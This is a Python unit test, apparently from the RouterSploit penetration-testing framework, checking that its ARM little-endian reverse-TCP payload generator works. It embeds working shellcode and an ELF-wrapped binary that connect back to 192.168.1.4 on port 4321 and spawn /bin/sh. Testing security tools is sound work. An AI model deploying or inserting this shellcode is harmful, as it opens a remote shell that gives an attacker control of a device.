from routersploit.modules.payloads.armle.reverse_tcp import Exploit


# armle reverse tcp with lhost=192.168.1.4  lport=4321
reverse_tcp = (
    b"\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\x0f"
    b"\x02\x19\x37\x01\xdf\x06\x1c\x08\xa1\x10\x22\x02\x37\x01\xdf"
    b"\x3f\x27\x02\x21\x30\x1c\x01\xdf\x01\x39\xfb\xd5\x05\xa0\x92"
    b"\x1a\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\x00\x10\xe1"
    b"\xc0\xa8\x01\x04\x2f\x62\x69\x6e\x2f\x73\x68\x00"
)

# elf armle reverse tcp
elf_armle_reverse_tcp = (
    b"\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x02\x00\x28\x00\x01\x00\x00\x00\x54\x80\x00\x00\x34\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01"
    b"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x80\x00\x00\x00\x80\x00\x00\x9c\x00\x00\x00\xe4\x00\x00"
    b"\x00\x07\x00\x00\x00\x00\x10\x00\x00\x01\x10\x8f\xe2\x11\xff"
    b"\x2f\xe1\x02\x20\x01\x21\x92\x1a\x0f\x02\x19\x37\x01\xdf\x06"
    b"\x1c\x08\xa1\x10\x22\x02\x37\x01\xdf\x3f\x27\x02\x21\x30\x1c"
    b"\x01\xdf\x01\x39\xfb\xd5\x05\xa0\x92\x1a\x05\xb4\x69\x46\x0b"
    b"\x27\x01\xdf\xc0\x46\x02\x00\x10\xe1\xc0\xa8\x01\x04\x2f\x62"
    b"\x69\x6e\x2f\x73\x68\x00"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Exploit()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.generate() == reverse_tcp
    assert payload.generate_elf(reverse_tcp) == elf_armle_reverse_tcp